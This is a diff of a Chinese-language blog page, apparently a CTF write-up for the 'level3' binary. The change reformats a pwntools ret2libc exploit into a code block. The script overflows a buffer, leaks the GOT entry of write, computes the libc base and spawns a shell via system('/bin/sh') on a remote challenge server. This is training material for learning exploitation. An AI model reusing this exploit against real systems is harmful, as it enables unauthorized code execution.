@@ -399,7 +399,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        1.1k
                     </div>
                     
 
@@ -442,29 +442,58 @@
 <p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p>
 <p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p>
 <p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p>
-<p>exp：<br>from pwn import*</p>
-<p>sh = remote(“124.126.19.106”,52825)</p>
-<p>#sh = process(“level3”)</p>
-<p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p>
-<p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p>
-<p>#print write_plt<br>#print write_got<br>#print main_addr</p>
-<p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p>
-<p>#p.recv()<br>sh.recv() </p>
-<p>sh.sendline(payload)</p>
-<p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p>
-<p>#print write_addr</p>
-<p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p>
-<p>#print(hex(libc_addr))</p>
-<p>#print “libc”+hex(libc_addr)</p>
-<p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p>
-<p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p>
-<p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p>
-<p>print “sys_addr =&gt; “+hex(sys_addr)</p>
-<p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p>
-<p>sh.recv()</p>
-<p>sh.sendline(payload)</p>
-<p>sh.interactive()</p>
-<p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p>
+<p>exp：</p>
+<pre><code>from pwn import*
+
+sh = remote(&quot;124.126.19.106&quot;,52825)
+
+#sh = process(&quot;level3&quot;)
+
+elf = ELF(&quot;level3&quot;)    
+libc = ELF(&quot;libc_32.so.6&quot;)
+
+write_plt = elf.symbols[&#39;write&#39;]    #write函数的plt地址
+write_got = elf.got[&#39;write&#39;]  #write函数的got地址，该地址存放write真实地址
+main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[&#39;main&#39;]搜索
+
+#print write_plt     
+#print write_got
+#print main_addr
+
+payload = &quot;A&quot;*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节
+
+#p.recv()
+sh.recv() 
+
+sh.sendline(payload)
+
+write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反
+
+#print write_addr
+
+libc_addr = write_addr - libc.symbols[&#39;write&#39;] #减去了write的offset
+
+#print(hex(libc_addr))
+
+#print &quot;libc&quot;+hex(libc_addr)
+
+binsh_addr = libc_addr + libc.search(&quot;/bin/sh&quot;).next()  #得到binsh真实地址
+
+
+
+#print &quot;binsh_addr =&gt; &quot;+hex(binsh_addr)
+
+sys_addr = libc_addr + libc.symbols[&#39;system&#39;]  #得到system真实地址
+
+print &quot;sys_addr =&gt; &quot;+hex(sys_addr)
+
+payload = &quot;A&quot;*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击
+
+sh.recv()
+
+sh.sendline(payload)
+
+sh.interactive()</code></pre><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p>
 <p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p>
 <p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>
 
@@ -816,7 +845,7 @@
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">16.6k</span>
+                <span class="white-color">21.1k</span>
             
 
             
